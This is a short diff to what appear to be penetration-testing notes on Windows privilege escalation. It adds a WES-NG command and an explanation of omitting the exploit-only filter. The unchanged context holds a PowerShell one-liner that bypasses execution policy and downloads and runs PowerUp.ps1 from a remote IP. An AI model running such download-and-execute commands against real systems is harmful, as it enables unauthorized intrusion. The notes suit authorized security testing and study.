@@ -688,7 +688,14 @@ Example:
 powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.114.88.43:8181/PowerUp.ps1'); Invoke-AllChecks"
 python3 wes.py systeminfo.txt -e
 python3 wes.py systeminfo.txt -e --impact "Elevation of Privilege"
+python3 wes.py systeminfo.txt --impact "Elevation of Privilege"
 ```
+
+Because -e only shows vulnerabilities with exploit references already known to WES-NG. There are cases where:
+
+WES-NG doesn't have an exploit link, but a working exploit exists on GitHub or elsewhere.
+
+Running without -e lets you see all privilege escalation candidates, and then you can search for exploit code yourself.
 
 ---
 
